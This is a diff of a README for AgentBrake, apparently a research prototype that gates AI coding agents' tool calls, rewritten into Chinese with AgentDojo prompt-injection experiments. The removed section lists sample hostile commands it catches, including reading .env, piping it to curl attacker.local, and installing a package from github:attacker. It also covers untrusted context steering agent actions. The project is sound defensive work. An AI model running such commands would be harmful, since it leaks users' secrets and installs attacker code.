@@ -1,431 +1,96 @@
-﻿# AgentBrake / AgentBrake v0.3
+# AgentBrake-Fusion
 
-AgentBrake is a pre-execution governance gateway for coding agents. It sits in front of model API responses, tool calls, shell commands, file operations, MCP tools, and package-manager actions, then decides whether each action can run on the host, only in a sandbox, only after approval, or not at all.
+AgentBrake-Fusion 是面向通用智能体的执行前安全裁决框架。系统拦截智能体即将发起的工具调用、外部动作、状态变更或信息外发，将动作候选转换为结构化证据，再通过多源证据融合裁决判断该动作应当放行、隔离执行、请求确认、隔离归档或阻断。
 
-Short version:
+本仓库保留 `agentbrake` 作为 Python 包名和 CLI 命令名，以兼容现有测试、脚本和实验流程；对外项目名称统一为 `AgentBrake-Fusion`。
 
-```text
-AgentBrake = a pre-execution safety gate for coding agents
-```
+## 命名口径
 
-## Formal Agent Integration
+| 模块 | 统一名称 | 中文解释 | 功能定位 |
+| --- | --- | --- | --- |
+| 系统整体 | AgentBrake-Fusion | 基于多源证据融合裁决的智能体安全刹车系统 | 面向通用智能体工具调用的执行前安全裁决框架。 |
+| 动作图 | ActionGraph | 智能体动作证据图 | 结构化用户任务、工具调用、参数来源、工具结果和历史审计。 |
+| 多源判断引擎 | MSJ Engine | Multi-Source Judgment Engine，多源综合判断引擎 | 融合多源证据并形成执行前安全裁决事实空间。 |
+| 证据裁决结构 | Constraint Product Lattice | 约束乘积格 | 显式处理证据冲突，生成稳定不过度粗暴的裁决。 |
+| 审计输出 | BrakeTrace | 刹车轨迹 / 工具调用审计记录 | 记录证据链、reason codes、裁决路径和恢复建议。 |
 
-AgentBrake now provides a simplified real-agent onboarding path:
-
-```bash
-agentbrake connect --repo . --agent codex --mode quick
-agentbrake connect --repo . --agent codex --mode standard
-agentbrake connect --repo . --agent openclaw --mode full
-agentbrake doctor --repo .
-agentbrake coverage --repo .
-agentbrake status --repo .
-agentbrake stop --repo .
-```
-
-- **Quick**: Gateway + generated `.agentbrake/config.yaml`, `agent.env`, and agent instructions.
-- **Standard**: Quick + guarded tool shims for shell, package-manager, Python, and Git commands.
-- **Full**: Standard + Studio, Approval API, and a generated demo request package.
-
-Multi-turn agents must pass a stable `metadata.agentbrake_run_id` and `metadata.conversation_id` on every turn. AgentBrake also returns `X-AgentBrake-Run-Id` from the Gateway so clients can confirm which run was resolved.
-
-## 核心算法：多源证据综合判断算法（R-MPF）
-
-AgentBrake's core decision procedure is the **多源证据综合判断算法
-（R-MPF）**. R-MPF, short for Repository-aware Multi-Evidence Policy Fusion,
-makes coding-agent decisions from repository context, user intent, tool
-semantics, source trust, asset risk, package risk, sandbox observations, and
-approval state rather than from a single rule or raw tool name.
-
-**Input**
+## 总体链路
 
 ```text
-ActionIR + evidence objects
+智能体工具调用候选
+  -> ActionGraph
+  -> MSJ Engine
+  -> Constraint Product Lattice
+  -> 执行前裁决
+  -> BrakeTrace
 ```
 
-Evidence objects can include `TaskContract`, `ContextGraph`, source provenance,
-`RepoAssetGraph`, `SecretTaintEvent`, `PackageEvent`, MCP/memory signals,
-approval records, and sandbox `ExecTrace`.
+裁决结果以工具边界为中心表达：
 
-**Procedure**
-
-```text
-1. Fact Extraction
-   Normalize ActionIR and evidence objects into PolicyFactSet.
-
-2. Invariants
-   Evaluate non-downgradable safety gates such as secret access, egress after
-   secret, untrusted-source authorization, repository escape, CI/CD boundary,
-   and supply-chain hard stops.
-
-3. EvidenceIndex / RuleIndex
-   Normalize facts through FactKeyRegistry and FactNormalizer, then retrieve
-   candidate PolicyGraph rules through exact, presence, range, list, composite,
-   residual, and conservative safe-prune paths.
-
-4. PredicateEval
-   Evaluate candidate rule predicates against the full PolicyFactSet.
-
-5. DecisionLattice
-   Merge baseline, invariant hits, and domain-rule hits into the strongest
-   applicable decision: allow, allow_in_sandbox, sandbox_then_approval,
-   quarantine, or block.
-
-6. EvidenceGraph
-   Emit a causal graph linking facts, retrieval nodes, predicates, rules,
-   lattice transitions, final decision, and evidence references.
-```
-
-**Output**
-
-```text
-PolicyDecision + CausalEvidenceGraph
-```
-
-The returned decision carries `policy_version`, `matched_rules`,
-`reason_codes`, `required_controls`, `evidence_refs`, `rule_trace`, fact hash,
-and the retrieval / predicate / lattice trace consumed by Studio.
-
-**Properties**
-
-- **Invariant non-downgrade**: once a non-downgradable invariant fires, later
-  domain rules cannot reduce the result to a weaker host-allow decision.
-- **Indexed retrieval soundness**: RuleIndex may over-recall rules, but tests
-  require indexed candidate evaluation to match full-scan rule evaluation.
-- **Decision monotonicity**: DecisionLattice only moves toward an equally strict
-  or stricter decision when stronger evidence or higher-risk rule hits appear.
-
-### Compatibility Upgrade: action graph, history, and constraint lattice
-
-The current implementation keeps the public API stable while adding the next
-generation internal model:
-
-- **ActionGraph**: every `ActionIR` can be associated with an `ActionGraph`.
-  Single-step actions become a one-node graph; compound commands preserve
-  sequence, pipe, redirect, dataflow, and controlflow edges.
-- **SessionState / HistorySummary**: `ExecTrace` remains the current-action
-  preflight observation, while `SessionState` stores redacted cross-action
-  history such as `secret_taint`, prior external sinks, package taint, CI taint,
-  and recent decisions.
-- **SemanticInvariantRegistry**: non-downgradable invariants are versioned
-  semantic predicates over typed facts, while legacy invariant IDs such as
-  `INV-SECRET-001` and `INV-EGRESS-001` stay stable.
-- **ConstraintLattice**: internal decisions are joined as a product lattice over
-  execution environment, network scope, data scope, human gate, persistence, and
-  audit scope, then mapped back to the existing five public decisions.
-- **Compatibility guards**: approval grants keep `action_hash_v1` stable while
-  `action_hash_v2` can bind optional action graph metadata; audit events use
-  `audit-event-v2` and include `action_graph`, `session_state_update`, and
-  `constraint_lattice_trace` event types.
-- **Feature flags**: `AGENTBRAKE_ENABLE_ACTION_GRAPH`,
-  `AGENTBRAKE_ENABLE_SESSION_STATE`, and
-  `AGENTBRAKE_ENABLE_CONSTRAINT_LATTICE` provide rollback-friendly switches.
-
-## Current Status
-
-AgentBrake is currently a **research-grade strengthened prototype / early engineering MVP**.
-
-It is suitable for papers, demos, internal experiments, gateway interception studies, and limited local trials. It is not yet a production-ready commercial security product.
-
-Unified maturity wording:
-
-| Scenario | Current readiness |
+| 裁决 | 含义 |
 | --- | --- |
-| Paper demo / project showcase | Mature for demos |
-| Internal research platform | Usable |
-| Small-team local trial | Trial-ready with manual setup and explicit safety boundaries |
-| Commercial security product | Not complete; still needs production sandboxing, real intelligence, multi-tenancy, and long-term audit operations |
+| `allow` | 证据支持当前动作在目标环境中执行。 |
+| `allow_in_sandbox` | 仅允许在隔离或受限环境中执行。 |
+| `require_confirmation` / `sandbox_then_approval` | 需要用户或上层策略确认后才可继续。 |
+| `quarantine` | 动作和证据进入隔离记录，不直接执行。 |
+| `block` | 证据显示该动作不应执行。 |
 
-Latest local verification:
+## 原型底层
 
-```text
-pytest --collect-only -q                    -> 202 collected
-python -m pytest -q --basetemp=.pytest_tmp_final_all -> passed
-python -m ruff check src tests              -> passed
-python -m ruff format --check src tests web/studio/src -> passed
-cd web/studio && npm run build              -> passed
-```
-
-## Reproducible Verification
-
-From a fresh checkout, install the test extra and run the public validation
-commands:
-
-```bash
-python -m pip install -e ".[test]"
-pytest -q
-ruff check src tests
-python -m compileall -q src tests
-```
-
-## Paper Demo Workflow
-
-Run the agent trace compatibility matrix:
-
-```bash
-agentbrake trace-matrix \
-  --traces tests/fixtures/agent_traces \
-  --output reports/trace_matrix
-```
-
-Validate a policy pack and start the local approval control plane:
-
-```bash
-agentbrake policy-validate --policy-pack policies/policy_pack_gateway.yaml
-agentbrake approval-api-start --store .agentbrake/gateway_approvals.jsonl --host 127.0.0.1 --port 8776
-```
-
-Render Studio Lite with audit, approval, benchmark, and trace-matrix evidence:
-
-```bash
-agentbrake studio \
-  --audit .agentbrake/gateway_audit.jsonl \
-  --approvals .agentbrake/gateway_approvals.jsonl \
-  --trace-matrix-report reports/trace_matrix/trace_matrix_report.json \
-  --bench-report reports/gateway_bench/gateway_bench_report.json \
-  --output reports/studio.html
-```
-
-## Live Studio
-
-AgentBrake Studio Pro is an interactive local dashboard for observing coding-agent
-runs behind AgentBrake Gateway. It visualizes source provenance, InstructionIR,
-ActionIR, policy decisions, approval state, evidence graphs, benchmark summaries,
-and attack scenarios in real time.
-
-Studio completion status:
-
-| Form | Current status |
-| --- | --- |
-| Studio Lite static report | Usable for offline archive and demos |
-| Studio Pro local realtime dashboard | Usable for local demos and experiments |
-| Production Studio | Not complete; still needs team permissions, long-term storage, cross-project search, multi-tenant views, and deployment operations |
-
-Studio Pro includes:
-
-- Run Cockpit with live timeline, decision stream, and automatic global event observation
-- Attack Lab with normal/attack storyboards and comparator metrics
-- React Flow trace graph for source -> action -> decision -> evidence paths
-- Action detail drawer with ActionIR, source trust, matched rules, rule trace, and evidence refs
-- Policy Debugger with rule condition matrix
-- RuleIndex retrieval panel with indexed facts, composite evidence hits, residual rules, safe-prune explanation, candidate set, and reduction ratio
-- Approval Center with action-hash-bound grant/deny confirmation
-- Sandbox Evidence panels for process tree, network intent, file diff, and redacted trace
-- Bench & Report filters for suite and security result
-- Redacted evidence bundle export
-- Demo-record cleanup with user-selectable backup before clearing local audit/approval logs
-
-The live dashboard subscribes to `/api/events/stream`, so new Gateway events from
-real agents appear without pressing refresh. It also keeps a short polling
-fallback for run summaries and approval/benchmark side panels.
-
-Start the local dashboard:
-
-```bash
-agentbrake studio-server \
-  --audit .agentbrake/gateway_audit.jsonl \
-  --approvals .agentbrake/gateway_approvals.jsonl \
-  --bench-report reports/gateway_bench/gateway_bench_report.json \
-  --host 127.0.0.1 \
-  --port 8780 \
-  --demo-mode
-```
-
-Run a deterministic attack story for the dashboard:
-
-```bash
-agentbrake studio-demo \
-  --scenario attack-dependency-confusion \
-  --audit .agentbrake/gateway_audit.jsonl
-```
-
-Recommended demo walkthrough:
-
-```bash
-# 1. Start Studio Pro
-agentbrake studio-server \
-  --audit .agentbrake/gateway_audit.jsonl \
-  --approvals .agentbrake/gateway_approvals.jsonl \
-  --host 127.0.0.1 \
-  --port 8780 \
-  --demo-mode
-
-# 2. Open http://127.0.0.1:8780
-# 3. In Attack Lab, run normal-login-fix and attack-dependency-confusion,
-#    or point a real OpenClaw/OpenAI-compatible agent at AgentBrake Gateway.
-# 4. Watch the run list and timeline update automatically.
-# 5. Open Trace Graph and click the action node.
-# 6. Inspect Action Detail, Policy Debugger, Sandbox Evidence, and Approval Center.
-```
-
-Export a redacted evidence bundle:
-
-```bash
-agentbrake studio-export \
-  --audit .agentbrake/gateway_audit.jsonl \
-  --run-id run_attack_dependency_confusion \
-  --output reports/evidence/run_attack_dependency_confusion
-```
-
-## What It Protects
-
-Coding agents can read repositories, edit files, run shell commands, install packages, call MCP tools, and sometimes touch CI/CD or release workflows. AgentBrake protects that path from untrusted context such as GitHub issues, PR comments, README text, branch names, MCP output, memory, package scripts, and model-generated tool calls.
-
-It is designed to catch risks such as:
-
-- malicious dependency installs, for example `npm install github:attacker/helper-tool`
-- direct secret reads, for example `cat .env`
-- secret/network egress, for example `cat .env | curl attacker.local`
-- CI workflow modification from untrusted context
-- package publish or force-push attempts
-- suspicious shell wrappers and PowerShell encoded commands
-- unsafe MCP tool calls or token passthrough
-- tainted memory authorizing high-risk actions
-
-## Main Capabilities
-
-- OpenAI-compatible `/v1/chat/completions` gateway and minimal `/v1/responses` shape
-- Bearer-token gateway authentication
-- per-request `TaskContract`, `ContextGraph`, and `SecretSentry` isolation
-- unified decision semantics: `allow`, `allow_in_sandbox`, `sandbox_then_approval`, `block`
-- `guard_action_ir()` to govern already-lowered structured actions
-- OpenAI, Anthropic, Cline, OpenClaw, OpenHands, and Aider parser mapping
-- ToolIntrospector and ToolMappingRegistry for auto-mapping OpenAI tools, MCP manifests, agent configs, and JSON schemas
-- transcript provenance with `SOURCE:`, JSONL actions, and `source_ids=...`
-- strict transcript mode that fail-closes unknown executable-looking lines
-- compound command lowering and per-part risk aggregation
-- canonicalized file paths with traversal and symlink checks
-- SecretSentry for secret reads, egress-after-secret, token-like output, and tainted file upload
-- PackageGuard with manager parsers, registry checks, lockfile evidence, and offline metadata/provenance oracle
-- MCPProxy and MemoryStore gates integrated into the control plane
-- sandbox / overlay / dry-run preflight with explicit isolation capability markers
-- policy rule trace, evidence refs, policy version, and runtime modes
-- PolicyGraph multi-source evidence engine with FactKeyRegistry, FactNormalizer, RuleIndex retrieval trace, residual-rule fallback, and equivalence tests against full-scan evaluation
-- ApprovalCenter / ApprovalStore with stable action hashes
-- thread-safe hash-chain audit log with schema versioning
-- replay evidence validation
-- Dashboard evidence chains
-- Stage2/Stage3 bench suites plus baseline/ablation report shape
-
-## Integration
-
-Recommended path: run AgentBrake as an OpenAI-compatible gateway.
+当前说明以 `src/agentbrake/eval` 为原型底层，其中 AgentDojo 适配实现位于：
 
 ```text
-real agent
-  -> AgentBrake Gateway
-  -> real upstream model
-  -> assistant message / tool_calls
-  -> AgentBrake policy checks
-  -> safe response back to agent
+src/agentbrake/eval/agentdojo/
 ```
 
-Start the gateway:
+关键模块对应关系：
 
-```bash
-export OPENAI_API_KEY=sk-...
+| AgentBrake-Fusion 概念 | 原型代码位置 | 说明 |
+| --- | --- | --- |
+| 工具边界拦截 | `gate/tool_firewall.py` | 在工具调用前构造证据、执行裁决并返回安全结果。 |
+| ActionGraph | `evidence/action_graph.py` | 生成智能体工具关系图，表达不可信输出、私有数据、攻击目标和后续动作之间的关系。 |
+| 证据事实空间 | `evidence/evidence.py` | 汇总任务授权、参数来源、历史状态、工具分类和图谱事实。 |
+| MSJ Engine | `evidence/fusion.py` | 将规则、套件策略和证据约束融合为最终裁决。 |
+| Constraint Product Lattice | `compat/types.py` 中的约束裁决结构 | 以执行环境、网络范围、数据范围、人类确认和审计范围组合裁决。 |
+| BrakeTrace | `ToolExecutionDecision.to_audit_event()` | 输出 reason codes、rule hits、模块开关、图谱事实和恢复提示。 |
 
-PYTHONPATH=src python -m agentbrake gateway-start \
-  --repo ./your-repo \
-  --host 127.0.0.1 \
-  --port 8765 \
-  --upstream-base-url https://api.openai.com/v1
-```
+## 实验流程
 
-Point your agent to:
+AgentDojo 实验步骤位于：
 
 ```text
-base_url = http://127.0.0.1:8765/v1
-api_key  = agentbrake-local
-model    = gpt-4.1
+experiments/agentdojo/
 ```
 
-This is intentionally host-neutral: any agent runtime that can use an
-OpenAI-compatible `base_url`, call MCP tools, or route shell/file operations
-through a wrapper can sit behind AgentBrake. That includes Cline, Codex-like
-clients, OpenClaw, OpenHands, Aider-style CLIs, and custom internal agents.
-
-For repo-local setup, generate shims and instructions for a specific host:
+建议从轻量流程开始：
 
 ```bash
-PYTHONPATH=src python -m agentbrake init-agent \
-  --repo ./your-repo \
-  --agent openclaw \
-  --task "fix login button and run tests"
+python -m pip install -e ".[test,agentdojo]"
+pytest -q tests/eval/agentdojo/unit
+python experiments/agentdojo/scripts/smoke_agentdojo_firewall.py
+python experiments/agentdojo/scripts/07_run_mini_benchmark.py --suites travel banking --limit 2
 ```
 
-For OpenClaw, you can also generate a dedicated provider bundle:
+配对对比实验可使用：
 
 ```bash
-PYTHONPATH=src python -m agentbrake openclaw-quickstart \
-  --repo ./your-repo \
-  --agentbrake-home . \
-  --model gpt-4.1
+python experiments/agentdojo/scripts/12_run_paired_mini.py --dry-run
+python experiments/agentdojo/scripts/12_run_paired_mini.py
 ```
 
-If your upstream key belongs to a non-OpenAI compatible provider, set the
-matching upstream base URL when starting AgentBrake. For example, LongCat uses:
+实验输出默认写入：
 
-```bash
-PYTHONPATH=src python -m agentbrake gateway-start \
-  --repo ./your-repo \
-  --host 127.0.0.1 \
-  --port 8765 \
-  --upstream-base-url https://api.longcat.chat/openai
+```text
+experiments/agentdojo/reports/
+experiments/agentdojo/logs/
 ```
 
-When an agent exposes tool definitions, AgentBrake can infer mappings instead
-of requiring a hand-written adapter. Gateway requests automatically inspect
-OpenAI-compatible `tools`, `metadata.mcp_manifests`, and
-`metadata.agent_config` before parsing returned tool calls.
+## 文档入口
 
-You can preview the inferred mapping:
+新的介绍文档集中在：
 
-```bash
-PYTHONPATH=src python -m agentbrake tool-introspect \
-  --input ./agent-tools.json \
-  --format openai
-```
-
-For agents that can wrap their shell tool:
-
-```bash
-PYTHONPATH=src python -m agentbrake exec-guard \
-  --repo ./your-repo \
-  --task "fix login button and run tests" \
-  -- npm test
-```
-
-## Decision Semantics
-
-| Decision | Meaning |
-| --- | --- |
-| `allow` | May run on the host |
-| `allow_in_sandbox` | May only run in sandbox / overlay / preflight, never directly on the host |
-| `sandbox_then_approval` | Do not execute; create or wait for approval |
-| `block` / `quarantine` | Do not execute |
-
-## Production Gap
-
-AgentBrake is not yet commercial-ready. The largest remaining gaps are:
-
-- production-grade sandboxing with container/namespace/seccomp/eBPF/network monitoring
-- live package metadata, tarball inspection, Sigstore/provenance, and typosquatting checks
-- real agent trace collection and schema-drift compatibility tests
-- stable policy language, signed policies, tenant policy management, and approval APIs/UI
-- production-grade Studio/Dashboard features such as team permissions, long-term storage, project-level search, and multi-tenant views
-- larger benchmark set with real agent traces and measured false-positive/false-negative rates
-
-See [Project Status and Commercialization Assessment](docs/PROJECT_STATUS.zh-CN.md) for the current roadmap.
-
-## Documentation
-
-Chinese documentation is currently the most complete:
-
-1. [中文 README](README.zh-CN.md)
-2. [PolicyGraph / RuleIndex multi-source evidence engine](docs/POLICYGRAPH_RULEINDEX.zh-CN.md)
-3. [Project Status / Commercialization Assessment](docs/PROJECT_STATUS.zh-CN.md)
-4. [Studio Guide](docs/STUDIO_GUIDE.zh-CN.md)
-5. [Real Agent Integration](docs/REAL_AGENT_INTEGRATION.zh-CN.md)
-6. [Gateway Guide](docs/GATEWAY_GUIDE.zh-CN.md)
-7. [Documentation Map](docs/README.zh-CN.md)
-
+- `docs/README.zh-CN.md`
+- `docs/ARCHITECTURE.zh-CN.md`
+- `docs/AGENTDOJO_EXPERIMENT.zh-CN.md`
+- `src/agentbrake/eval/agentdojo/README.md`
+- `experiments/agentdojo/README.md`
